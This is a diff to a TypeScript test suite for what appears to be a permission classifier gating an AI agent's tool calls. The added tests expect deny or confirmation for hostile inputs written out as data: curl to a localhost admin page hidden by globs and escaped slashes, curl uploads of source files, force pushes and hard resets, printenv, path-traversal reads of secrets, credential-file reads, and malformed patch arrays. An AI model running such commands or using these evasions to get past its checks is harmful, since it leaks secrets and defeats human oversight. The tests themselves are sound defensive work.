@@ -198,6 +198,21 @@ describe('classifyOperation', () => {
       input: {command: 'curl', args: ['http://127%2e0%2e0%2e1/admin']},
     }, context);
     expect(privateTarget.action).toBe('deny');
+
+    const globbedPrivateTarget = await classifyOperation({
+      tool: 'run_command',
+      input: {command: 'curl', args: ['http://127.0.0.{1,2}/admin']},
+    }, context);
+    expect(globbedPrivateTarget.action).toBe('deny');
+
+    const shellEscapedPrivateTarget = await classifyOperation({
+      tool: 'run_command',
+      input: {
+        command: 'sh',
+        args: ['-c', 'curl http:\\/\\/127.0.0.1/admin'],
+      },
+    }, context);
+    expect(shellEscapedPrivateTarget.action).toBe('deny');
   });
 
   it('does not allow aliases, case changes, shell mode, or empty args to bypass command rules', async () => {
@@ -262,9 +277,51 @@ describe('classifyOperation', () => {
     expect(decision.action).toBe('deny');
   });
 
+  it('rejects accessor elements in patch operation arrays', async () => {
+    const operations: unknown[] = [];
+    Object.defineProperty(operations, '0', {
+      configurable: true,
+      enumerable: true,
+      get: () => ({
+        type: 'update',
+        path: 'src/a.ts',
+        expected: 'a',
+        replacement: 'b',
+      }),
+    });
+    operations.length = 1;
+
+    const decision = await classifyOperation({
+      tool: 'apply_patch',
+      input: {operations},
+    }, context);
+
+    expect(decision.action).toBe('deny');
+  });
+
+  it('rejects extra own properties in patch operation arrays', async () => {
+    const operations = [{
+      type: 'update',
+      path: 'src/a.ts',
+      expected: 'a',
+      replacement: 'b',
+    }] as Array<Record<string, string>> & {metadata?: string};
+    operations.metadata = 'not-json-array-data';
+
+    const decision = await classifyOperation({
+      tool: 'apply_patch',
+      input: {operations},
+    }, context);
+
+    expect(decision.action).toBe('deny');
+  });
+
   it('keeps destructive commands inside shell arguments at confirmation level', async () => {
     for (const input of [
       {command: 'sh', args: ['-c', 'git -C . reset --hard']},
+      {command: 'sh', args: ['-c', "git reset '--hard'"]},
+      {command: 'sh', args: ['-c', "git 'push' --force"]},
+      {command: 'sh', args: ['-c', 'printenv']},
       {command: 'env', args: ['-S', 'sudo true']},
     ]) {
       expect((await classifyOperation({
@@ -283,6 +340,7 @@ describe('classifyOperation', () => {
     for (const input of [
       {command: 'cat', args: ['command-link/secret.txt']},
       {command: 'sh', args: ['-c', 'cat ../command-outside/secret.txt']},
+      {command: 'sh', args: ['-c', 'cat ..\\/command-outside/secret.txt']},
     ]) {
       expect((await classifyOperation({
         tool: 'run_command',
@@ -294,7 +352,10 @@ describe('classifyOperation', () => {
   it.each([
     {command: 'npm', args: ['publish']},
     {command: 'git', args: ['push']},
+    {command: 'git', args: ['send-pack', 'origin', 'main']},
     {command: 'curl', args: ['--upload-file', 'src/index.ts', 'https://example.com']},
+    {command: 'curl', args: ['-d@src/index.ts', 'https://example.com']},
+    {command: 'curl', args: ['-Tsrc/index.ts', 'https://example.com']},
   ])('requires confirmation for external publishing: $command', async (input) => {
     expect((await classifyOperation({
       tool: 'run_command',
@@ -320,6 +381,23 @@ describe('classifyOperation', () => {
       tool: 'read_file',
       input: {path: '.env'},
     }, context);
+    expect(decision.action).toBe('confirm');
+  });
+
+  it.each([
+    '.git-credentials',
+    '.docker/config.json',
+    '.config/gh/hosts.yml',
+    'credentials.json',
+  ])('requires confirmation before reading credential path %s', async (path) => {
+    await mkdir(join(workspace, path, '..'), {recursive: true});
+    await writeFile(join(workspace, path), 'secret\n');
+
+    const decision = await classifyOperation({
+      tool: 'read_file',
+      input: {path},
+    }, context);
+
     expect(decision.action).toBe('confirm');
   });
 
@@ -385,5 +463,24 @@ describe('classifyOperation', () => {
     expect(direct.normalizedScope).toEqual(['read:src/index.ts']);
     expect(dotted.normalizedScope).toEqual(direct.normalizedScope);
     expect(dotted.fingerprint).toBe(direct.fingerprint);
+  });
+
+  it('binds fingerprints to the canonical workspace identity', async () => {
+    const otherWorkspace = join(sandbox, 'other-workspace');
+    await mkdir(join(otherWorkspace, 'src'), {recursive: true});
+    await writeFile(join(otherWorkspace, 'src/index.ts'), 'export {};\n');
+    const operation = {
+      tool: 'read_file',
+      input: {path: 'src/index.ts'},
+    };
+
+    const first = await classifyOperation(operation, context);
+    const second = await classifyOperation(operation, {
+      ...context,
+      workspace: otherWorkspace,
+    });
+
+    expect(second.normalizedScope).toEqual(first.normalizedScope);
+    expect(second.fingerprint).not.toBe(first.fingerprint);
   });
 });
